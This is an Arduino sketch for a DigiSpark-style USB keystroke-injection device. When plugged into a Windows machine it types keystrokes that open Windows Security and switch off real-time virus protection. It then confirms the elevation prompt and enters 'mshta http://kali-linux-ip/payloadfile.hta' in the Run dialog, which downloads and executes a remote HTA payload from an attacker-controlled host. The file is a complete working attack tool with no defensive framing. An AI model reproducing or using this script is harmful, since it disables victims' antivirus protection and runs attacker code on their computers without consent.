#include <DigiKeyboard.h>
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F
#define KEY_DOWN_ARROW 0x51
#define KEY_UP_ARROW 0x52
#define KEY_ESC 0x29
#define KEY_TAB 0x2B

void setup() {
  DigiKeyboard.sendKeyStroke(0);
       // Device to get ready
}

void loop() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT); // Open Windows Start (Search)
  DigiKeyboard.println("virus protection");              // Typing in search
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // ENTER
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); // TAB
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000); 
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // RUN DIALOG
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("mshta http://kali-linux-ip/payloadfile.hta"); // PAYLOAD GOES HERE
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  for(;;){
    
  }
  // nothing, run only once
}
